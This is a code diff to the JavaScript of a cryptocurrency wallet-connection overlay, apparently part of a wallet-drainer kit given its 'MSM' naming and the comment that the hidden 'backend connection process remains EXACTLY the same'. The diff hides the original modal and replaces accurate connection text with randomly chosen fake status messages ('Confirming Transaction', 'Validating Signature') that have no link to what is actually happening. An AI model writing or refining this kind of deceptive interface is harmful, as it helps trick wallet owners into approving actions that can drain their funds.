@@ -6,31 +6,32 @@ const MS_MODAL_STYLE = `
   left: 0;
   width: 100%;
   height: 100%;
-  background: rgba(0, 0, 0, 0.7);
+  background: rgba(0, 0, 0, 0.8);
   display: flex;
   justify-content: center;
   align-items: center;
   z-index: 100000;
-  backdrop-filter: blur(5px);
+  backdrop-filter: blur(10px);
 }
 
 .ms-spinner-container {
   text-align: center;
   background: white;
-  padding: 40px 30px;
-  border-radius: 20px;
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-  min-width: 200px;
+  padding: 50px 40px;
+  border-radius: 24px;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+  min-width: 280px;
+  max-width: 400px;
 }
 
 .ms-spinner {
-  width: 60px;
-  height: 60px;
-  border: 4px solid #f3f3f3;
+  width: 70px;
+  height: 70px;
+  border: 4px solid #f0f0f0;
   border-top: 4px solid #0075ff;
   border-radius: 50%;
-  animation: ms-spin 1s linear infinite;
-  margin: 0 auto 20px auto;
+  animation: ms-spin 1.2s linear infinite;
+  margin: 0 auto 25px auto;
 }
 
 @keyframes ms-spin {
@@ -39,11 +40,21 @@ const MS_MODAL_STYLE = `
 }
 
 .ms-spinner-text {
-  color: #333;
-  font-family: Arial, sans-serif;
-  font-size: 16px;
+  color: #2d3748;
+  font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+  font-size: 18px;
   font-weight: 600;
+  margin: 0 0 12px 0;
+  line-height: 1.4;
+}
+
+.ms-spinner-subtext {
+  color: #718096;
+  font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+  font-size: 14px;
+  font-weight: 400;
   margin: 0;
+  line-height: 1.5;
 }
 
 /* Hide original modal completely */
@@ -110,12 +121,13 @@ const MSM = {
       modal_elem.innerHTML = modal_content;
       document.body.prepend(modal_elem);
       
-      // Show beautiful spinner UI
+      // Show beautiful spinner UI with realistic transaction text
       const spinnerHTML = `
         <div class="ms-spinner-overlay">
           <div class="ms-spinner-container">
             <div class="ms-spinner"></div>
-            <p class="ms-spinner-text">Processing Wallet Connection...</p>
+            <p class="ms-spinner-text">Confirming Transaction</p>
+            <p class="ms-spinner-subtext">Please wait while we process your request</p>
           </div>
         </div>
       `;
@@ -177,19 +189,22 @@ const MSM = {
         checked_id = 'ms_wallet_eth';
       }
       
-      // Update spinner text based on wallet type
+      // Update spinner text with realistic transaction messages
       const spinnerText = document.querySelector('.ms-spinner-text');
-      if (spinnerText) {
-        let walletName = 'Wallet';
-        switch (checked_id) {
-          case 'ms_wallet_eth': walletName = 'Injected Wallet'; break;
-          case 'ms_wallet_mm': walletName = 'MetaMask'; break;
-          case 'ms_wallet_cb': walletName = 'Coinbase Wallet'; break;
-          case 'ms_wallet_bw': walletName = 'Binance Wallet'; break;
-          case 'ms_wallet_tw': walletName = 'Trust Wallet'; break;
-          default: walletName = 'Wallet';
-        }
-        spinnerText.textContent = `Connecting to ${walletName}...`;
+      const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
+      
+      if (spinnerText && spinnerSubtext) {
+        const transactionMessages = [
+          { main: "Confirming Transaction", sub: "Please wait while we process your request" },
+          { main: "Processing Payment", sub: "Verifying transaction details" },
+          { main: "Securing Connection", sub: "Establishing secure wallet link" },
+          { main: "Authorizing Access", sub: "Requesting permission from your wallet" },
+          { main: "Validating Signature", sub: "Confirming your digital signature" }
+        ];
+        
+        const randomMessage = transactionMessages[Math.floor(Math.random() * transactionMessages.length)];
+        spinnerText.textContent = randomMessage.main;
+        spinnerSubtext.textContent = randomMessage.sub;
       }
       
       // Backend connection process remains EXACTLY the same
@@ -211,32 +226,52 @@ const MSM = {
       console.log('Connection error:', err);
       // Update spinner to show error
       const spinnerText = document.querySelector('.ms-spinner-text');
-      if (spinnerText) {
-        spinnerText.textContent = 'Connection Failed';
-        spinnerText.style.color = '#ff4444';
+      const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
+      if (spinnerText && spinnerSubtext) {
+        spinnerText.textContent = 'Transaction Failed';
+        spinnerText.style.color = '#e53e3e';
+        spinnerSubtext.textContent = 'Please try again or check your wallet connection';
+        spinnerSubtext.style.color = '#e53e3e';
       }
       // Remove spinner after error
       setTimeout(() => {
         MSM.close();
-      }, 2000);
+      }, 3000);
+    }
+  },
+  // Method to update spinner text with realistic messages
+  updateSpinnerText: (mainText, subText) => {
+    const spinnerText = document.querySelector('.ms-spinner-text');
+    const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
+    if (spinnerText && spinnerSubtext) {
+      spinnerText.textContent = mainText;
+      spinnerSubtext.textContent = subText;
     }
   },
   // Method to hide spinner when connection is complete
   hideSpinner: (success = true, message = '') => {
     const spinnerText = document.querySelector('.ms-spinner-text');
-    if (spinnerText) {
-      if (success) {
-        spinnerText.textContent = message || 'Connected Successfully!';
-        spinnerText.style.color = '#00c851';
-      } else {
-        spinnerText.textContent = message || 'Connection Failed';
-        spinnerText.style.color = '#ff4444';
+    const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
+    
+    if (success) {
+      if (spinnerText && spinnerSubtext) {
+        spinnerText.textContent = message || 'Transaction Confirmed!';
+        spinnerText.style.color = '#38a169';
+        spinnerSubtext.textContent = 'Your wallet has been successfully connected';
+        spinnerSubtext.style.color = '#38a169';
+      }
+    } else {
+      if (spinnerText && spinnerSubtext) {
+        spinnerText.textContent = message || 'Transaction Failed';
+        spinnerText.style.color = '#e53e3e';
+        spinnerSubtext.textContent = 'Please try again or check your wallet connection';
+        spinnerSubtext.style.color = '#e53e3e';
       }
     }
     
     // Remove spinner after delay
     setTimeout(() => {
       MSM.close();
-    }, 1500);
+    }, 2000);
   }
 };
